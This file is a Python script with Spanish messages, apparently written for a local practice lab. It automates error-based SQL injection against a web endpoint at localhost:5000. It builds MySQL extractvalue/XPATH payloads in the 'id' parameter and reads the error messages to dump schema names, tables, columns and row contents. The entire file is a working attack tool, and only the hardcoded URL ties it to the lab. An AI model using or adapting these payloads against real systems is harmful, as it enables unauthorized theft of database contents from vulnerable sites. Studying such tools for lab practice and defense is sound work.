#!/usr/bin/python3

import requests
import argparse
import signal
import re

# -
# Functions
# -
# -- Avoid errors using CTRL^C to kill program execution
def def_handler(sig, frame):
    print("\n(!) CTRL^C detectado, saliendo...\n")
    exit(0)

signal.signal(signal.SIGINT, def_handler)

# -- Control program arguments
def arguments():
    parser = argparse.ArgumentParser(description="Lanzboratorio - Inyección SQL basada en errores (:")
    parser.add_argument('-d', '--database', dest='arg_database', metavar='DATABASE', nargs='*', help='(-d) extract database names, (-d DB) set a database name to extract tables')
    parser.add_argument('-t', '--table', dest='arg_table', metavar='TABLE', help='table name to extract columns')
    parser.add_argument('-c', '--column', dest='arg_column', metavar='COLUMN', nargs='*', help='column name (-c COL1) or columns (-c COL1 COL2) to extract data')
    return parser

# -- Send the SQLi request and extract the information
def sqli_extract(malicious_query):

    result = ""
    for row in range(0,1000):
        # Move the position each 20 characters and save them, to avoid output limitations
        for pos in range(1,2000,20):

            data_get = {"id": "2 AND extractvalue(rand(),concat(0x3a,(SUBSTRING((" + malicious_query.replace('<ROW>',str(row)) + f"),{pos},20))));#"}
            r = requests.get(url, params=data_get)

            try:
                temp_result = re.findall(r'1105, &#34;XPATH syntax error: &#39;:(.*?)&#39;', r.text)[0]
                result += temp_result

                if len(temp_result) == 0:
                    print("·", result)
                    temp_result = ""
                    result = ""
                    break
            except IndexError:
                print("\n(+) Datos no encontrados o fin de ellos")
                return

# -- Generate malicious query to extract databases
def sqli_extract_databases():
    print("\n(+) Extrayendo todas las bases de datos del gestor MySQL\n")

    malicious_query = f"SELECT schema_name FROM information_schema.schemata LIMIT <ROW>,1"
    sqli_extract(malicious_query)

    print("(+) Si quieres ver las tablas de alguna base de datos, usa -d <BASE_DE_DATOS>")

# -- Generate malicious query to extract tables from a database
def sqli_extract_tables(arg_database):
    print("\n(+) Extrayendo todas las tablas de la base de datos especificada\n")

    print("(+) Base de datos:", arg_database, "\n")

    malicious_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = '{arg_database}' LIMIT <ROW>,1"
    sqli_extract(malicious_query)

    print("(+) Si quieres ver las columnas de alguna tabla, usa -t <TABLA>")

# -- Generate malicious query to extract columns from a database and a table
def sqli_extract_columns(arg_database, arg_table):
    print("\n(+) Extrayendo todas las columnas de la base de datos y tabla especificadas\n")

    print("(+) Base de datos:", arg_database)
    print("(+) Tabla:", arg_table, "\n")

    malicious_query = f"SELECT column_name FROM information_schema.columns WHERE table_schema = '{arg_database}' AND table_name = '{arg_table}' LIMIT <ROW>,1"
    sqli_extract(malicious_query)

    print("(+) Si quieres ver el contenido de alguna columna, usa -c <COLUMNA>")
    print("(+) O varias, -c <COLUMNA1> <COLUMNA2>")

# -- Generate malicious query to extract column data from a database and a table
def sqli_extract_information(arg_database, arg_table, arg_column):
    print("\n(+) Extrayendo valores de las columnas de la base de datos y tabla especificadas\n")

    plain_columns = " : ".join(arg_column)

    print("(+) Base de datos:", arg_database)
    print("(+) Tabla:", arg_table)
    print("(+) Columna:", plain_columns, "\n")

    sql_columns = ",':',".join(arg_column)
    malicious_query = f"SELECT CONCAT({sql_columns}) FROM {arg_database}.{arg_table} LIMIT <ROW>,1"
    sqli_extract(malicious_query)

# -
# Variables
# -
parser = arguments() # interact with parser functions
args = parser.parse_args() # arguments
url = "http://localhost:5000/details"

# -
# Program flow
# -
if '__main__' == __name__:
    # -- Help menu
    if args.arg_database == None:
        parser.print_help()
    # -- Extract column data
    elif args.arg_database and args.arg_table and args.arg_column:
        sqli_extract_information(args.arg_database[0], args.arg_table, args.arg_column)
    # -- Extract column names
    elif args.arg_database and args.arg_table:
        sqli_extract_columns(args.arg_database[0], args.arg_table)
    # -- Extract table names
    elif args.arg_database:
        sqli_extract_tables(args.arg_database[0])
    # -- Extract database names
    elif args.arg_database == []:
        sqli_extract_databases()
